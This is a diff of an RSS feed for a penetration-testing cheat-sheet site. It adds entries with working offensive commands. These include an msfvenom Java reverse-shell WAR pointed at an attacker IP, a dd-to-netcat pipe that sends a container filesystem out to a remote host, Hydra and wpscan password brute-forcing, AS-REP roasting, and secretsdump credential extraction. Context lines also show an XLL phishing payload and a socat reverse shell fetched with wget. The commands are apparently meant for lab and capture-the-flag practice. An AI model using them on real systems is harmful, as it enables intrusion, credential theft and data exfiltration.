@@ -15,6 +15,20 @@
       <description> Check Apache version apache&#xA;Config location /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/default-ssl.conf </description>
     </item>
     <item>
+      <title>Apache Tomcat</title>
+      <link>https://tldrbins.github.io/apache_tomcat/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/apache_tomcat/</guid>
+      <description> RCE (Authenicated) # Create a malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war # 1. Login to Tomcat Web Application Manager # 2. WAR file to deploy -&amp;gt; Deploy # 3. Click /revshell in Applications table </description>
+    </item>
+    <item>
+      <title>ASP</title>
+      <link>https://tldrbins.github.io/asp-roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/asp-roasting/</guid>
+      <description> Impacket Download Impacket&#xA;ASP-Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 ASP-REP Vulnerable Users impacket-GetNPUsers &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 </description>
+    </item>
+    <item>
       <title>Compressed Files</title>
       <link>https://tldrbins.github.io/compressed_files/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -36,11 +50,32 @@
       <description> Advance curl # PUT request with a file curl -X PUT http://example.com/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://example.com/test.txt --data-binary @test.aspx # POST request with with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; &amp;#39;http://example.com/upload&amp;#39; </description>
     </item>
     <item>
+      <title>Custom Word List Generator</title>
+      <link>https://tldrbins.github.io/custom_wordlist_generator/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/custom_wordlist_generator/</guid>
+      <description> CeWL Download CeWL&#xA;# Creating custom wordlist by spidering target website cewl example.com -w example.com.wordlist --with-numbers </description>
+    </item>
+    <item>
+      <title>disk</title>
+      <link>https://tldrbins.github.io/disk/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/disk/</guid>
+      <description>Abuse disk group to read container&amp;rsquo;s filesystem # Show devices lsblk # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g., dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444 # Extract dm-0 gunzip dm-0.gz # Mount the filesystem sudo mount dm-0-orig /mnt/ # Privilege read ls /mnt/root/ Note: can take a long time to transfer</description>
+    </item>
+    <item>
       <title>DNS Enum</title>
       <link>https://tldrbins.github.io/dns_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dns_enum/</guid>
       <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
+    </item>
+    <item>
+      <title>Docker</title>
+      <link>https://tldrbins.github.io/docker/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/docker/</guid>
+      <description> Privesc docker group docker run -v /:/mnt -it bash bash ls /mnt/root </description>
     </item>
     <item>
       <title>dotnet</title>
@@ -82,7 +117,7 @@
       <link>https://tldrbins.github.io/find/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/find/</guid>
-      <description> Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc </description>
+      <description> Find files of type file find . -type f Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 ! -newermt 2024-12-31 -ls 2&amp;gt;/dev/null </description>
     </item>
     <item>
       <title>Flask Cookie</title>
@@ -99,11 +134,46 @@
       <description> Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;#39;branch_name&amp;#39; --oneline # Show diff, a and b are commit hash # a is older commit git diff [a] [b] # Show commit git show &amp;#39;commit_hash&amp;#39; git-dumper Download git-dumper&#xA;git-dumper http://10.10.11.10/.git result/ </description>
     </item>
     <item>
+      <title>Hydra</title>
+      <link>https://tldrbins.github.io/hydra/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/hydra/</guid>
+      <description> Hydra Web Page Login Form hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt https-post-form &amp;#34;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#34; -l : username -P : wordlist https-post-form : service /login.php : action ^PASS^ : payload indicator Incorrect password : login failure string </description>
+    </item>
+    <item>
+      <title>IIS</title>
+      <link>https://tldrbins.github.io/iis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/iis/</guid>
+      <description>IIS Version Version Start Date End Date IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 IIS 10 on Windows 10 Pro Jul 29, 2015 IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 IIS 8.5 on Windows Server 2012 R2 Nov 25, 2013 Oct 10, 2023 IIS 8.</description>
+    </item>
+    <item>
+      <title>Java</title>
+      <link>https://tldrbins.github.io/java/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/java/</guid>
+      <description> Java Decompile JAR Download jd-gui&#xA;jd-gui </description>
+    </item>
+    <item>
       <title>Java Environment</title>
       <link>https://tldrbins.github.io/java_envionment/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/java_envionment/</guid>
       <description> Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac </description>
+    </item>
+    <item>
+      <title>Keepass</title>
+      <link>https://tldrbins.github.io/keepass/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/keepass/</guid>
+      <description> kpcli Download kpcli&#xA;# Open kdbx kpcli --kdb key.kdbx # List all passwords find . # Show password (e.g., #0) show -f 0 </description>
+    </item>
+    <item>
+      <title>Kerberos</title>
+      <link>https://tldrbins.github.io/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kerberos/</guid>
+      <description>Kerbrute Download kerbrute&#xA;kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .</description>
     </item>
     <item>
       <title>Listeners</title>
@@ -159,14 +229,14 @@
       <link>https://tldrbins.github.io/mongodb_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mongodb_general/</guid>
-      <description> General Connect to Mongo Database mongo 10.10.11.10:27017 Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() </description>
+      <description> General Connect to Mongo Database mongo 10.10.11.10:27017 # Connect local with creds and specified database mongo -u user -p password db_name Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() # Insert entry into collections db.COLLECTION_NAME.insert({&amp;#34;key&amp;#34;: &amp;#34;value&amp;#34;}) </description>
     </item>
     <item>
       <title>Mount Share</title>
       <link>https://tldrbins.github.io/share_mount/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/share_mount/</guid>
-      <description> NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check how shares are mounted cat /etc/exports # root_squash : running as root on local system will be treated as the default nobody user in target # no_all_squash: every other users permission will translate from local system to target SMB Mount share sudo mount -t cifs &amp;#34;//10.10.11.10/Remote Shares&amp;#34; /mnt </description>
+      <description>NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports # root_squash : running as root on local system will be treated as the default nobody user in target # no_all_squash: every other users permission will translate from local system to target SMB Mount share sudo mount -t cifs //10.10.11.10/share /mnt # With creds sudo mount -t cifs -o user=username,pass=password //10.</description>
     </item>
     <item>
       <title>MSSQL General</title>
@@ -202,6 +272,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
       <description>Privilege Escalation User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -pPassword mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
+    </item>
+    <item>
+      <title>NetExec (nxc)</title>
+      <link>https://tldrbins.github.io/nxc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/nxc/</guid>
+      <description> nxc Download nxc&#xA;SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash </description>
     </item>
     <item>
       <title>Network Discovery</title>
@@ -260,11 +337,39 @@
       <description>Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to &amp;#34;victim@victim.</description>
     </item>
     <item>
+      <title>POP3</title>
+      <link>https://tldrbins.github.io/pop3/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pop3/</guid>
+      <description> POP3 # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER user PASS password # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
+    </item>
+    <item>
+      <title>Port Knocking</title>
+      <link>https://tldrbins.github.io/port_knocking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/port_knocking/</guid>
+      <description> knockd # Find knock sequence cat /etc/knockd.conf # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 &amp;gt;/dev/null; done; ssh -i id_rsa user@10.10.11.10 </description>
+    </item>
+    <item>
+      <title>RPC</title>
+      <link>https://tldrbins.github.io/rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rpc/</guid>
+      <description> RPC rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U domain/username 10.10.11.10 # Commands querydispinfo enumdomusers </description>
+    </item>
+    <item>
       <title>Searchsploit</title>
       <link>https://tldrbins.github.io/searchsploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/searchsploit/</guid>
       <description> searchsploit # Search service with specific version # For example: samba 3.0 searchsploit samba 3.0 # Read the exploit searchsploit -x unix/remote/16320.rb # Copy the exploit searchsploit -m unix/remote/16320.rb </description>
+    </item>
+    <item>
+      <title>secretsdump</title>
+      <link>https://tldrbins.github.io/secretsdump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/secretsdump/</guid>
+      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL </description>
     </item>
     <item>
       <title>SMB Enum</title>
@@ -299,7 +404,7 @@
       <link>https://tldrbins.github.io/ssh/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ssh/</guid>
-      <description>Check SSH version openssh-server&#xA;Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa # Fix: no matching host key type found. Their offer: ssh-rsa,ssh-dss ssh user@10.</description>
+      <description>Check SSH version openssh-server (ubuntu) openssh-server (debian)&#xA;Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa # Fix: no matching host key type found. Their offer: ssh-rsa,ssh-dss ssh user@10.</description>
     </item>
     <item>
       <title>SSL</title>
@@ -334,14 +439,14 @@
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; #Ctrl-Z to send the process to background stty raw -echo; fg #After fg, press enter again export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
+      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; #Ctrl-Z to send the process to background, then stty raw -echo; fg #After fg, press enter again, then export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
     </item>
     <item>
       <title>Web Directory Enum</title>
       <link>https://tldrbins.github.io/web_directory_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/web_directory_enum/</guid>
-      <description> Web Directory Enum feroxbuster Download feroxbuster&#xA;HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx gobuster Download gobuster&#xA;gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 40 -x php wfuzz # Fuzzing IDOR wfuzz -z range,1-99 http://example.com/users/FUZZ </description>
+      <description> feroxbuster Download feroxbuster&#xA;HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash / to each request feroxbuster -u http://example.com/ -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt wfuzz Fuzzing Number Range wfuzz -z range,1-99 http://example.com/users/FUZZ gobuster Download gobuster&#xA;gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 40 -x php </description>
     </item>
     <item>
       <title>Webdav</title>
@@ -362,7 +467,7 @@
       <link>https://tldrbins.github.io/wordpress/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/wordpress/</guid>
-      <description> wpscan Download wpscan&#xA;# HTTP wpscan --url http://10.10.11.10 -e ap,t,tt,u # HTTPS wpscan --url https://10.10.11.10 -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url http://10.10.11.10 -e ap,t,tt,u --api-token API_KEY </description>
+      <description> wpscan Get Free API key&#xA;# HTTP wpscan --url http://example.com -e ap,t,tt,u # HTTPS wpscan --url http://example.com -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url http://example.com -e ap,t,tt,u --api-token API_KEY # Brute force wp-admin wpscan --url http://example.com --passwords passwords.txt --usernames admin </description>
     </item>
     <item>
       <title>Writable /etc/passwd</title>
